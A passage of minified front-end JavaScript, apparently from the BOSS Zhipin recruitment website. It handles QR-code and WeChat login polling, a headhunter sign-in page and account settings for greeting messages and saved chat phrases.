                setTimeout("window.location.reload()", 3e3)))
            },
            error: function() {
                i.find(".sign-scan").is(":visible") && "none" == $(".sign-scan .invalid-box").css("display") && setTimeout(function() {
                    Sign.scanPending(i)
                }, 5e3)
            }
        })
    },
    scanPending: function(i) {
        var n = i.find(".sign-scan .uuid").val()
          , a = i.find(".sign-scan .qrcodeimg-box img").data("url")
          , o = this;
        if (n && i.find(".sign-scan").is(":visible"))
            $.ajax({
                type: "GET",
                url: "/wapi/zppassport/qrcode/scan?uuid=" + n,
                dataType: "json",
                cache: !1,
                timeout: 1e5,
                success: function(t) {
                    try {
                        _T.sendTracking("qrcode_scan_result_uuid+" + n + "_result_" + JSON.stringify(t))
                    } catch (e) {}
                    t.scaned ? t.scanedV2 ? o.setSecondQrcode(i, n, function(e) {
                        o.secondScanTimer = setTimeout(function() {
                            o.scanGetHeadImg(n),
                            o.scanLogin(i, n, t, a + n),
                            clearTimeout(o.secondScanTimer),
                            o.secondScanTimer = null
                        }, 1e3),
                        o.scanSecond(i, n, e, a + n)
                    }) : t.newScaned ? (o.scanGetHeadImg(n),
                    o.scanLogin(i, n, t, a + n)) : o.scanJump(i, n, t, a + n) : i.find(".sign-scan").is(":visible") && "none" == $(".sign-scan .invalid-box").css("display") && Sign.scanPending(i)
                },
                error: function(e) {
                    i.find(".sign-scan").is(":visible") && "none" == $(".sign-scan .invalid-box").css("display") && setTimeout(function() {
                        Sign.scanPending(i)
                    }, 5e3);
                    try {
                        _T.sendTracking("qrcode-scan_error_uuid_" + n + "_info_" + JSON.stringify(e))
                    } catch (e) {}
                }
            });
        else
            try {
                _T.sendTracking("scan_pending_break_uuid_" + n + "_show_" + i.find(".sign-scan").is(":visible"))
            } catch (e) {}
    },
    setSecondQrcode: function(t, e, i) {
        $.ajax({
            type: "GET",
            url: "/wapi/zppassport/captcha/getSecondKey?uuid=" + e,
            dataType: "json",
            success: function(e) {
                0 == e.code && i && (t.find(".qrcodeimg-box img").attr("src", "/wflow/zpweixin/qrcode/getqrcode?content=" + e.zpData.qrId + "&w=200&h=200"),
                i(e))
            }
        })
    },
    scanSecond: function(t, i, n, a) {
        var e;
        Sign.secondScanTimer && (e = n.zpData || {},
        $.ajax({
            type: "GET",
            url: "/wapi/zppassport/qrcode/scanSecond?uuid=" + e.qrId,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                e.scaned ? (Sign.secondScanTimer && clearTimeout(Sign.secondScanTimer),
                Sign.scanGetHeadImg(i),
                Sign.scanLogin(t, i, e, a)) : Sign.scanSecond(t, i, n, a)
            },
            error: function() {
                Sign.scanSecond(t, i, n, a)
            }
        }))
    },
    scanGetHeadImg: function(e) {
        $.ajax({
            type: "GET",
            url: "/wapi/zppassport/qrcode/getHeadImg?qrId=" + e,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                0 == e.code && e.zpData && e.zpData.large ? ($(".sign-scan .qrcode-box").hide(),
                $(".sign-scan .text-tip").hide(),
                $(".sign-scan .login-step-box img").attr("src", e.zpData.large),
                $(".sign-scan .login-step-box").show(),
                e.zpData.wxMp ? $(".sign-scan .login-step-box .login-step-detail").text("请在移动设备上确认登录") : $(".sign-scan .login-step-box .login-step-detail").text("请在App端确认登录")) : e && (-1 < Sign.loginLimitCode.indexOf(e.code) || 4942 <= e.code && e.code <= 4950) ? Sign.loginLimitTip(e.code, {
                    message: e.message,
                    closeCallback: function() {
                        window.location.reload()
                    }
                }) : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                setTimeout(function() {
                    window.location.reload()
                }, 2e3))
            },
            error: function() {}
        })
    },
    scanLogin: function(t, i, n, a) {
        var o = this;
        $.ajax({
            type: "GET",
            url: "/wapi/zppassport/qrcode/scanLogin?qrId=" + i,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                e.scaned ? e.login ? ($(".sign-scan .login-step-text .login-step-title").text("正在登录..."),
                $(".sign-scan .login-step-text .login-step-detail").hide(),
                Sign.scanJump(t, i, n, a)) : ($(".sign-scan .qrcode-box").show(),
                $(".sign-scan .text-tip").show(),
                $(".sign-scan .login-step-box").hide(),
                e = t.find(".sign-scan"),
                Sign.getRandomkey(t, e, function(e) {
                    Sign.scanPending(t),
                    Sign.scanValid()
                })) : o.scanLogin(t, i, n, a)
            },
            error: function() {
                setTimeout(function() {
                    o.scanLogin(t, i, n, a)
                }, 5e3)
            }
        })
    },
    showDeskGeekTip: function() {
        $.confirm({
            content: "你当前是牛人身份，请在 BOSS直聘 APP 的『设置』选项中切换身份后重试",
            title: "请切换为 Boss 身份后登录",
            closeIcon: !1,
            cancelButton: !1,
            confirmButton: "确定",
            columnClass: "",
            backgroundDismiss: !1,
            onOpen: function() {
                this.$confirmButton.parent().css("text-align", "center")
            },
            confirm: function() {},
            error: function(e) {}
        })
    },
    checkDeskIsBoss: function(t) {
        $.ajax({
            type: "post",
            url: "/user/identity/check.json",
            dataType: "json",
            success: function(e) {
                1 == e.rescode ? t(e.identity) : alert("登录失败，请稍后再试")
            },
            error: function() {
                alert("登录失败，请稍后再试")
            }
        })
    },
    checkMiniScanned: function(t, i) {
        $.ajax({
            type: "get",
            url: "/wapi/zppassport/qrcode/scanByMp?uuid=" + i,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                e.scaned ? Sign.scanJumpMiniLogin(i) : Sign.miniAppExpired || Sign.checkMiniScanned(t, i)
            },
            error: function() {
                Sign.miniAppExpired || setTimeout(function() {
                    Sign.checkMiniScanned(t, i)
                }, 5e3)
            }
        })
    },
    scanJumpMiniLogin: function(e) {
        try {
            Sign.enterLoginPageTime && _T.sendEvent("login-flow-done-time", ((new Date).getTime() - Sign.enterLoginPageTime) / 1e3 + "")
        } catch (e) {}
        e = {
            uuid: e
        };
        window.BossZhipinBridge && (e.environment = "BossZhipinBridge"),
        e.pk = getQueryString("ka") || $("#page_key_name").val(),
        $.ajax({
            type: "get",
            url: "/wapi/zppassport/qrcode/loginConfirm",
            data: e,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                if (0 == e.code) {
                    var t = e.zpData || {};
                    redirectUrl = t.youleUrl || t.toUrl
                } else {
                    if (-1 < Sign.loginLimitCode.indexOf(e.code) || 4942 <= e.code && e.code <= 4950)
                        return void Sign.loginLimitTip(e.code, {
                            message: e.message,
                            closeCallback: function() {
                                window.location.reload()
                            }
                        });
                    if (4931 != e.code)
                        return void $.dialog({
                            title: "提示",
                            content: e.message || "登录失败",
                            closeText: !0,
                            cancelText: "",
                            confirmText: "知道了",
                            wrapClass: "dialog-prop-default",
                            onConfirm: function(e) {
                                e.remove(),
                                location.reload()
                            },
                            onClose: function() {
                                location.reload()
                            }
                        });
                    $.toast({
                        type: "error",
                        content: e.message || "请使用BOSS直聘APP扫码登录"
                    });
                    var i = setTimeout(function() {
                        location.href = "/web/user/?mode=app",
                        clearTimeout(i)
                    }, 2e3)
                }
                LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : window.location.href = LOGIN_SOURCE && "live" == LOGIN_SOURCE ? Sign.getLiveUrl() : redirectUrl
            }
        })
    },
    checkIsScanned: function(t) {
        var i = t.find(".scene").val();
        i && t.is(":visible") && $.ajax({
            type: "GET",
            url: "/wapi/zppassport/qrcode/scan?uuid=" + i,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                e.scaned ? (_T.sendEvent("wx_sao_success_" + i),
                $(".sign-wrap .sign-form").hide(),
                $(".sign-succ").show(),
                Sign.scanJumpRegister(t)) : t.is(":visible") && "none" == t.find(".invalid-box").css("display") && Sign.checkIsScanned(t)
            },
            error: function() {
                t.is(":visible") && "none" == t.find(".invalid-box").css("display") && setTimeout(function() {
                    Sign.checkIsScanned(t)
                }, 5e3)
            }
        })
    },
    scanJumpRegister: function(e) {
        try {
            Sign.enterLoginPageTime && _T.sendEvent("login-flow-done-time", ((new Date).getTime() - Sign.enterLoginPageTime) / 1e3 + "")
        } catch (e) {}
        var t = e.find(".qrcodeimg-box img").data("url");
        setTimeout(function() {
            LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : $.ajax({
                type: "GET",
                url: t,
                dataType: "json",
                cache: !1,
                timeout: 1e5,
                success: function(e) {
                    var t;
                    0 == e.code ? (t = e.zpData || {},
                    window.location.href = (1 == t.identity ? t.pcToUrl : t.toUrl) || "/") : -1 < Sign.loginLimitCode.indexOf(e.code) || 4942 <= e.code && e.code <= 4950 ? Sign.loginLimitTip(e.code, {
                        message: e.message,
                        closeCallback: function() {
                            window.location.reload()
                        }
                    }) : $.dialog({
                        title: "提示",
                        content: e.message || "注册失败",
                        closeText: !0,
                        cancelText: "",
                        confirmText: "知道了",
                        wrapClass: "dialog-prop-default",
                        onConfirm: function(e) {
                            e.remove(),
                            location.reload()
                        },
                        onClose: function() {
                            location.reload()
                        }
                    })
                }
            })
        }, 3e3)
    },
    RegScanValid: function(e) {
        Sign.timer = setTimeout(function() {
            e.find(".invalid-box").show()
        }, 18e4)
    },
    sendKaEvent: function(e) {
        try {
            _T.sendEvent(e)
        } catch (e) {}
    },
    drawSideSignBg: function(a) {
        var o = a.getContext("2d")
          , s = (a.width = a.parentNode.offsetWidth,
        window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(e) {
            window.setTimeout(e, 1e3 / 60)
        }
        ,
        a.height / 7)
          , r = a.height / 1.3
          , c = 0
          , l = ["rgba(255,255,255, 0.4)", "rgba(255,255,255, 0.30)"];
        !function e() {
            o.clearRect(0, 0, a.width, a.height),
            360 == ++c && (c = 0);
            for (var t = l.length - 1; 0 <= t; t--) {
                o.fillStyle = l[t];
                var i = (c + 100 * t) * Math.PI / 180
                  , n = Math.sin(i) * s
                  , i = Math.cos(i) * s;
                o.beginPath(),
                o.moveTo(0, r + n),
                o.bezierCurveTo(a.width / 2, r + n - s, a.width / 2, r + i - s, a.width, r + i),
                o.lineTo(a.width, a.height),
                o.lineTo(0, a.height),
                o.lineTo(0, r + n),
                o.closePath(),
                o.fill()
            }
            requestAnimFrame(e)
        }()
    },
    setJumpUrl: function(e) {
        var t = window.location.href
          , i = "";
        function n(e, t) {
            return e.some(function(e) {
                return -1 != t.indexOf(e)
            })
        }
        switch (!0) {
        case n(["/gongsi/?ka=", "/job_detail/?ka=", "app.zhipin.com/"], t):
            i = "";
            break;
        case n(["/job_detail/", "/xiaoyuan/", "/gongsi/", "/gongsir/", "/returnee_jobs/", "/companys/", "/article/", "/news.zhipin.com/", "/zhaopin", "/zt/", "/faxian/", "/huati/", "/wenti/"], t):
            i = window.location.pathname;
            break;
        case n(["/zhaopin/"], t):
            i = "/web/geek/recommend";
            break;
        default:
            i = ""
        }
        e.append('<input name="jumpUrl" type="hidden" value="' + i + '"/>')
    },
    showAgreementDialog: function() {
        $.dialog({
            title: "BOSS直聘网页版服务协议",
            content: "<p>本服务协议被视为《BOSS直聘用户协议》的补充协议，是其不可分割的组成部分，与其构成统一整体。如本服务协议与《BOSS直聘用户协议》存在冲突的，以本服务协议为准。</p><p>除非您已阅读并接受本服务协议所有条款，否则您无权使用本服务。您登录、使用BOSS直聘网页版，即视为您已阅读并同意接受本服务协议的约束。</p><p>您理解并同意：</p><p>1.BOSS直聘平台（以下简称“平台”）包括BOSS直聘移动客户端、BOSS直聘小程序端（包括微信、百度等）及BOSS直聘网页版，您登录、使用BOSS直聘网页版必须遵守本服务协议、《BOSS直聘用户协议》、《隐私政策》及平台内公布的其他专项协议或细则（以下总称“平台规则”）。</p><p>2.登录BOSS直聘网页版应同时满足下列全部条件：已根据《BOSS直聘用户协议》的要求成功注册BOSS直聘账号；招聘者账号的招聘信用达到网页版准入要求。</p><p>3.系统将对招聘者账号的招聘信用进行评估，如您的招聘者账号尚未达到网页版准入要求的，您可以根据界面提示提升您账号的招聘信用。</p><p>4.平台可能为不同的客户端开发部分不同的功能，如招聘者可以在BOSS直聘网页版进行道具分配、人员管理、常用语回复设置等；求职者可以在BOSS直聘网页版选择求职频道、进行简历解析等，您可根据需要选择适用的客户端。</p><p>5.BOSS直聘网页版将根据您账号的类型、性质（如账号为招聘者或求职者，招聘者账号为企业管理员或普通员工等）为您提供不同的服务，具体您可登录BOSS直聘网页版浏览。</p><p>6.如您的账号在使用平台服务时存在违反平台规则的行为，BOSS直聘网页版有权视情节采取，包括但不限于限制您的账号登录网页版、暂停或终止向您提供网页版的部分或全部服务等相关处理措施。</p>",
            closeText: !0,
            confirmText: !1,
            cancelText: !1,
            wrapClass: "dialog-agreement",
            onOpen: function(e) {},
            onConfirm: function(e) {
                e.remove()
            },
            onClose: function(e) {}
        })
    },
    getLiveUrl: function() {
        var e = window.location.hostname;
        return -1 !== e.indexOf("127") || -1 !== e.indexOf("qa") ? "https://live-qa.weizhipin.com/web/boss/webcast" : -1 !== e.indexOf("pre") ? "https://live-pre.zhipin.com/web/boss/webcast" : "https://live.zhipin.com/web/boss/webcast"
    }
}
  , hunterSign = ($(function() {
    $(".sign-wrap").length && $(".sign-wrap").is(":visible") && Sign.init($(".sign-wrap:visible")),
    void 0 !== PlaceholderCheck && PlaceholderCheck.init()
}),
{
    init: function() {
        ($(".hunter-index").length || $(".hunter-register").length) && ($(".hunter-index .btn-sign").on("click", function() {
            hunterSign.showPop($(this))
        }),
        $(".hunter-register").length && Sign.dropSelect($(this).find(".sign-form")),
        hunterSign.setErcode(),
        $(".hunter-index").find(".sign-form .tab span").on("click", function() {
            hunterSign.switchTab($(this))
        }),
        $(".hunter-register").find(".register-op").on("click", function() {
            hunterSign.switchRegister($(this))
        }),
        $(".hunter-index").length && (hunterSign.elAnimate(),
        $(window).scroll(function() {
            hunterSign.elAnimate(),
            50 <= $(window).scrollTop() ? $(".fix-container").slideDown() : $(".fix-container").slideUp()
        })),
        50 <= $(window).scrollTop() ? $(".fix-container").slideDown() : $(".fix-container").slideUp())
    },
    showPop: function(e) {
        $.confirm({
            content: $(".sign-wrap").html(),
            title: !1,
            confirmButton: !1,
            cancelButton: !1,
            closeIcon: !0,
            columnClass: "pop-sign-box",
            onOpen: function() {
                e.hasClass("btn-register") && (this.$content.find(".sign-form").hide(),
                this.$content.find(".sign-register").show()),
                Sign.init(this.$content)
            }
        })
    },
    switchTab: function(e) {
        var t = e.index()
          , i = e.parents(".sign-form");
        e.addClass("cur").siblings().removeClass("cur"),
        i.find(".tab-container").eq(t).show().siblings(".tab-container").hide(),
        0 == t && ($(".code-container .overdue").hide(),
        hunterSign.setErcode()),
        i.find(".tip-error").html("")
    },
    switchRegister: function(e) {
        var t = e.parents(".login-container").index()
          , e = e.parents(".login-wechat");
        e.find(".login-container").eq(t).addClass("hide").siblings().removeClass("hide"),
        Sign.init(),
        e.find(".tip-error").html("")
    },
    isVisible: function(e) {
        return $(window).height() > e.offset().top - $(window).scrollTop() + 100
    },
    elAnimate: function() {
        hunterSign.isVisible($(".hunter-index .info-box").eq(0)) && $(".hunter-index .info-box").eq(0).animate({
            marginTop: "0",
            opacity: "1"
        }, 400),
        hunterSign.isVisible($(".hunter-index .info-box").eq(1)) && $(".hunter-index .info-box").eq(1).animate({
            marginTop: "76px",
            opacity: "1"
        }, 300)
    },
    setErcode: function() {
        if ($("#login_container").length && _PAGE.appid) {
            for (var e = "", t = document.querySelectorAll('link[type="text/css"]'), i = 0; i < t.length; i++) {
                var n = t[i].getAttribute("href");
                n && (-1 < n.indexOf("http") || 0 == n.indexOf("//")) && -1 < n.indexOf("/web/") && (e = n.split("/web/")[0])
            }
            new WxLogin({
                id: "login_container",
                appid: _PAGE.appid,
                scope: _PAGE.scope,
                redirect_uri: _PAGE.redirectUri,
                state: "",
                style: "",
                href: e + "/web/hunter/css/hunter-index.css"
            });
            var a = $(".code-container .overdue");
            setTimeout(function() {
                a.is(":visible") || a.show()
            }, 6e4),
            a.find(".btn-refresh").on("click", function() {
                setTimeout(function() {
                    a.is(":visible") || a.show()
                }, 6e4),
                a.hide();
                new WxLogin({
                    id: "login_container",
                    appid: _PAGE.appid,
                    scope: _PAGE.scope,
                    redirect_uri: _PAGE.redirectUri,
                    state: "",
                    style: "",
                    href: e + "/web/hunter/css/hunter-index.css"
                })
            })
        }
    }
})
  , GeekAccount = ($(function() {
    hunterSign.init()
}),
{
    URL: {
        mobile: {
            url: "/user/update/mobile.json",
            method: "POST"
        },
        sendsms: {
            url: "/user/account/sendsms.json",
            method: "POST"
        },
        password: {
            url: "/user/update/password.json",
            method: "POST"
        },
        del: {
            url: "/setting/geek/replyword/del.json",
            method: "get"
        },
        add: {
            url: "/setting/geek/replyword/add.json",
            method: "get"
        },
        greeting: {
            url: "/geek/update/greeting.json",
            method: "POST"
        }
    },
    init: function() {
        this.changeTab(),
        this.requestData($(".account-container .set-page"), $(".account-container .set-page ul li.cur").data("tab"), $(".account-container .set-page ul li.cur").data("url"))
    },
    showModalToast: function(e, t) {
        $.toast({
            content: e,
            lock: !0,
            type: t,
            wrapClass: "",
            position: "top",
            time: 3e3
        })
    },
    appendAccount: function() {
        $(".account-container .set-page .set-nav").prepend('<div class="account-manager">账号设置</div>')
    },
    changeTab: function() {
        var i = this;
        $(".account-container .set-page ul").on("click", "li", function() {
            $(this).siblings("li").removeClass("cur"),
            $(this).addClass("cur");
            var e = $(this).data("url")
              , t = $(this).data("tab");
            i.requestData($(".account-container .set-page"), t, e)
        })
    },
    switchGreetingBtn: function() {
        var t = this;
        $(".account-container .sayhello-form").on("click", ".switch-op .op-switch", function() {
            var e = $(this);
            e.hasClass("op-switch-on") ? t.submitSwitch(0, e) : t.submitSwitch(1, e)
        })
    },
    submitSwitch: function(t, i) {
        var n;
        i.hasClass("disabled") || (i.addClass("disabled"),
        n = this,
        $.ajax({
            url: n.URL.greeting.url,
            method: n.URL.greeting.method,
            dataType: "json",
            data: {
                status: t
            },
            success: function(e) {
                1 == e.rescode ? (n.showModalToast("设置成功", "success"),
                n.switchSuccessFn(t, i)) : 0 == e.rescode && n.showModalToast(e.resmsg, "error"),
                i.removeClass("disabled")
            },
            error: function() {
                i.removeClass("disabled")
            }
        }))
    },
    switchSuccessFn: function(e, t) {
        var i = t.parents(".switch-op").siblings("p.gray");
        if (0 == e) {
            t.removeClass("op-switch-on").addClass("op-switch-off"),
            t.parents(".setting-switch").siblings().remove(),
            i.text("招呼语已关闭，系统将不再为您发出打招呼语，您可能会收到更少Boss的回复");
            try {
                _T.sendEvent("icebreaker_off")
            } catch (e) {}
        } else {
            try {
                _T.sendEvent("icebreaker_on")
            } catch (e) {}
            t.parents(".set-content").siblings(".set-nav").find("ul li.cur").trigger("click")
        }
    },
    requestData: function(t, i, e) {
        var n = this;
        $.ajax({
            url: e,
            method: "get",
            dataType: "json",
            success: function(e) {
                e.rescode && (t.find(".set-content").remove(),
                "" == e.html && t.append('<div class="set-content"></div>'),
                t.append(e.html));
                $(".account-container .bind-phone .operate-area .phone-num").html();
                switch (i) {
                case "phone":
                    n.formValidate(),
                    n.confirmChangePhone(),
                    n.randomImage(),
                    n.dropSelect($(".phone-form")),
                    $(".ipt-message-code").attr("maxlength", "6");
                    break;
                case "pwd":
                    n.confirmChangePassword();
                    break;
                case "usalchat":
                    n.chatTabOperate(),
                    n.chatUseSentence();
                    break;
                case "sayhello":
                    n.submitUsal(),
                    n.switchGreetingBtn()
                }
            }
        })
    },
    submitUsal: function() {
        var t = this
          , i = $(".sayhello-form")
          , n = $(".sayhello-form").find(".ipt-area");
        $(".account-container .sayhello-form").on("change", ".radio-list .radio input", function() {
            var e = $(this).val();
            $.ajax({
                url: t.URL.greeting.url,
                method: t.URL.greeting.method,
                dataType: "json",
                data: {
                    status: 1,
                    templateId: e
                },
                success: function(e) {
                    1 == e.rescode ? $.toast({
                        content: "设置成功",
                        lock: !0,
                        type: "success",
                        wrapClass: "",
                        position: "top",
                        time: 3e3
                    }) : 0 == e.rescode && (e = e.resmsg,
                    $.toast({
                        content: e,
                        lock: !0,
                        type: "error",
                        wrapClass: "",
                        position: "top",
                        time: 3e3
                    }))
                }
            })
        }),
        i.on("click", ".op-sentence .link-add", function() {
            i.find(".defined-form").addClass("show-defined-form"),
            i.find(".btn-remove").hide(),
            i.find('.defined-form input[name="templateId"]').val(""),
            i.find(".defined-form .ipt-area").text("").val("").focus(),
            $(window).scrollTop($(".account-container").height()),
            t.countArea(n),
            i.find(".defined-form .tip-text").text("请不要填写手机、QQ、微信等联系方式或广告信息，否则系统将封禁您的账号！")
        }),
        i.on("click", ".link-modify", function() {
            var e = $(this).closest("li").find("span").text();
            i.find(".defined-form").addClass("show-defined-form"),
            i.find(".defined-form .ipt-area").focus(),
            n.text(e).val(e),
            i.find('input[name="templateId"]').val($(this).closest("li").find('input[name="sendMsg"]').val()),
            i.find(".btn-remove").show(),
            $(window).scrollTop($(".account-container").height()),
            t.countArea(n),
            i.find(".defined-form .tip-text").text("请不要填写手机、QQ、微信等联系方式或广告信息，否则系统将封禁您的账号！")
        }),
        n.on("input", function() {
            t.countArea($(this))
        }),
        i.on("click", ".defined-form .btns .btn", function() {
            if ($(this).hasClass("btn-back"))
                $(this).closest(".defined-form").removeClass("show-defined-form");
            else if ($(this).hasClass("btn-remove"))
                t.delGreetingword($(this));
            else {
                if ($(this).closest("dl").find(".defined-form .count-num .red").length)
                    return !1;
                t.postGreetingWord($(this))
            }
        })
    },
    chatTabOperate: function() {
        var e = this;
        $(".account-container .set-usalbox").on("click", ".op-sentence .link-add", function() {
            $(this).closest("dl").find(".defined-form").addClass("show-defined-form"),
            $(this).closest("dl").find(".defined-form .ipt-area").focus(),
            $(this).closest("dl").find(".defined-form .tip-text").text("请不要填写手机、QQ、微信等联系方式或广告信息，否则系统将封禁您的账号！"),
            $(window).scrollTop($(".account-container").height()),
            $(this).closest("dl").find(".count-num").length && e.countArea($(this).closest("dl").find(".ipt-area"))
        }),
        $(".account-container .defined-form .ipt-area").on("input", function() {
            e.countArea($(this))
        }),
        $(".set-usalbox").on("click", ".defined-form .btns .btn", function() {
            if ($(this).hasClass("btn-back"))
                $(this).closest("dl").find(".defined-form").removeClass("show-defined-form"),
                $(".account-container .defined-form .ipt-area").val("");
            else {
                if ("" == $(this).closest("dl").find(".defined-form .ipt-area").val().replace(/(\s*$)/g, ""))
                    return $(this).closest("dl").find(".defined-form .tip-text").text("请输入正确的常用语"),
                    $(this).closest("dl").find(".defined-form .ipt-area").focus(),
                    !1;
                {
                    if ($(this).closest("dl").find(".defined-form .count-num .red").length)
                        return $(this).closest("dl").find(".defined-form .tip-text").text("常用语不能超过200个字"),
                        $(this).closest("dl").find(".defined-form .ipt-area").focus(),
                        !1;
                    e.renderList($(".account-container .defined-form .ipt-area").val())
                }
            }
        }),
        $(".set-usalbox .sentence-list").on("click", ".link-remove", function() {
            e.delData($(this)),
            e.chatUseSentence()
        })
    },
    delData: function(t) {
        var i = this;
        (t = t).attr("data-url"),
        t.closest(".sentence-list");
        $.dialog({
            title: "",
            content: "确认删除该条常用语吗？",
            confirmText: "确定",
            element: t,
            cancelText: "取消",
            inline: !0,
            opacityLock: !0,
            wrapClass: "dialog-around-default",
            onOpen: function(e) {
                e.find(".dialog-footer .btns .btn-cancel").attr("ka", "chatwords_delete_cancel"),
                e.find(".dialog-footer .btns .btn-sure").attr("ka", "chatwords_delete_sure")
            },
            onConfirm: function(e) {
                $.ajax({
                    url: i.URL.del.url,
                    method: i.URL.del.method,
                    data: {
                        id: t.attr("data-id")
                    },
                    dataType: "json",
                    success: function(e) {
                        1 == e.rescode ? t.closest("li").fadeOut(function() {
                            t.parent("li").remove(),
                            i.chatUseSentence()
                        }) : (e = e.resmsg,
                        $.toast({
                            content: e,
                            lock: !0,
                            type: "error",
                            wrapClass: "",
                            position: "top",
                            time: 3e3
                        }))
                    }
                })
            },
            onClose: function(e) {}
        })
    },
    postGreetingWord: function(i) {
        var n = i.closest("form")
          , e = n.attr("action")
          , t = n.serialize();
        return n.find(".ipt-area").val(n.find(".ipt-area").val().replace(/(^[\s\n\r]*)|([\s\n\r]*$)/g, "")),
        "" == n.find(".ipt-area").val().replace(/(\s*$)/g, "") ? (n.find(".tip-text").text("请输入正确的打招呼语"),
        n.find(".ipt-area").focus(),
        !1) : n.find(".count-num .red").length ? (n.find(".tip-text").text("打招呼语不能超过60个字"),
        n.find(".ipt-area").focus(),
        !1) : !i.hasClass("disabled") && (i.addClass("disabled"),
        void $.ajax({
            url: e,
            type: "POST",
            data: t,
            dataType: "JSON",
            timeout: 3e4,
            success: function(e) {
                var t;
                e.rescode ? (t = i.closest(".sayhello-form"),
                i.closest(".show-defined-tab").length ? ($.toast({
                    content: "保存成功",
                    type: "success"
                }),
                i.closest(".show-defined-tab").find("li.cur").attr("data-text", filterXss(n.find(".ipt-area").val()))) : (t.find(".defined-form").removeClass("show-defined-form"),
                t.find(".sentence-list").length && t.find(".sentence-list ul").append(e.html),
                t.find(".sayhello-list").length && (n.find('input[name="templateId"]').val() ? t.find('input[value="' + n.find('input[name="templateId"]').val() + '"]').closest("li").find("span").text(n.find(".ipt-area").val()) : (t.find(".sayhello-list ul").append(e.html),
                t.find(".op-sentence").hide())))) : $.toast({
                    content: e.resmsg,
                    type: "error"
                }),
                i.removeClass("disabled"),
                n.find(".tip-text").text("请不要填写手机、QQ、微信等联系方式或广告信息，否则系统将封禁您的账号！")
            },
            error: function(e) {
                i.removeClass("disabled"),
                n.find(".tip-text").text("请不要填写手机、QQ、微信等联系方式或广告信息，否则系统将封禁您的账号！"),
                $.toast({
                    content: "保存失败，请检查网络后重试",
                    type: "error"
                })
            }
        }))
    },
    delGreetingword: function(n) {
        var a = (n = n).closest("form");
        $.dialog({
            title: "确认删除该条打招呼语吗？",
            content: "",
            confirmText: "确定",
            cancelText: "取消",
            wrapClass: "dialog-chat-default dialog-alert-default setting-remove-dialog",
            onOpen: function(e) {},
            onConfirm: function(t) {
                var i = a.find('input[name="templateId"]').val()
                  , e = a.closest(".sayhello-form").find('input[name="sendMsg"]').eq(0).val();
                $.ajax({
                    url: "/geek/delete/customgreeting.json",
                    type: "POST",
                    data: {
                        templateId: i,
                        candidateId: e
                    },
                    dataType: "JSON",
                    timeout: 3e4,
                    success: function(e) {
                        e.rescode ? ($.toast({
                            content: "删除成功",
                            type: "success"
                        }),
                        a.closest(".sayhello-form").find('.sayhello-list input[value="' + i + '"]').closest("li").remove(),
                        a.closest(".sayhello-form").find('.sayhello-list input[type="radio"]').eq(0).prop("checked", "checked"),
                        a.find(".ipt-area").text("").val(""),
                        a.find('input[name="templateId"]').val(""),
                        n.closest(".defined-form").removeClass("show-defined-form"),
                        a.closest(".sayhello-form").find(".op-sentence").show()) : $.toast({
                            content: e.resmsg,
                            type: "error"
                        }),
                        t.remove()
                    },
                    error: function(e) {
                        $.toast({
                            content: "删除失败，请稍后再试",
                            type: "error"
                        }),
                        t.remove()
                    }
                })
            },
            onClose: function(e) {}
        })
    },
    renderList: function(e) {
        var t = this;
        $.ajax({
            url: t.URL.add.url,
            method: t.URL.add.method,
            dataType: "json",
            data: {
                word: $(".set-usalbox .ipt-area").val().replace(/(^[\s\n\r]*)|([\s\n\r]*$)/g, "")
            },
            success: function(e) {
                1 == e.rescode ? ($(".account-container .sentence-list ul").append(e.html),
                $(".account-container .defined-form .ipt-area").val(""),
                $(".set-usalbox .op-sentence .link-add").closest("dl").find(".defined-form").removeClass("show-defined-form"),
                t.chatUseSentence()) : 0 == e.rescode && (e = e.resmsg,
                $.toast({
                    content: e,
                    lock: !0,
                    type: "error",
                    wrapClass: "",
                    position: "top",
                    time: 3e3
                }),
                $(".account-container .defined-form .ipt-area").focus())
            }
        })
    },
    getLength: function(e) {
        if (!e)
            return 0;
        for (var t = 0, i = (e = e.replace(/(^[\s\n\r]*)|([\s\n\r]*$)/g, "")).length, n = 0; n < i; n++)
            t += 255 < e.charCodeAt(n) ? 1 : .5;
        return Math.ceil(t)
    },
    countArea: function(e) {
        var t = (e = e).attr("data-range")
          , i = this.getLength(e.val())
          , e = e.closest(".defined-form").find(".count-num");
        e && e.length && (t = t.split(","),
        e.html("<em" + (i > t[1] ? ' class="red"' : "") + ">" + i + "</em>/" + t[1]))
    },
    phoneNumShow: function(e) {
        e = e || String(e);
        return e.slice(0, 3) + "****" + e.slice(7)
    },
    dropSelect: function(t) {
        t.find(".dropdown-select").each(function() {
            $(this).on("click", function() {
                $(this).hasClass("dropdown-disabled") || ($(this).toggleClass("dropdown-select-open"),
                $(this).closest(".form-row").find(".dropdown-menu").toggleClass("dropdown-menu-open"))
            })
        }),
        t.find(".dropdown-menu").each(function() {
            var e = $(this)
              , t = e.closest(".form-row").find(".dropdown-select")
              , i = t.find(".text-select")
              , n = t.find('input[type="hidden"]');
            e.on("click", "li", function() {
                i.text($(this).attr("data-val")),
                n.val($(this).attr("data-val")),
                n.closest("dd").find(".tip-text").remove(),
                e.removeClass("dropdown-menu-open"),
                t.removeClass("dropdown-select-open")
            })
        }),
        $(document).on("touchend click", function(e) {
            $(e.target).closest(".dropdown-menu").length || $(e.target).closest(".dropdown-select").length || (t.find(".dropdown-select").removeClass("dropdown-select-open"),
            t.find(".dropdown-menu").removeClass("dropdown-menu-open"))
        })
    },
    getRandomkey: function(i, e) {
        var t = (e = e).find(".ipt-code").attr("data-url")
          , n = e.find(".randomkey");
        "" == n.val() && $.ajax({
            url: t,
            type: "POST",
            dataType: "json",
            data: {
                pk: $("#page_key_name").val()
            },
            success: function(e) {
                var t;
                1 == e.rescode && (t = "/wflow/zpweixin/qrcode/getqrcode?content=" + e.qrId + "&w=200&h=200",
                i.find(".randomkey").val(e.randomKey),
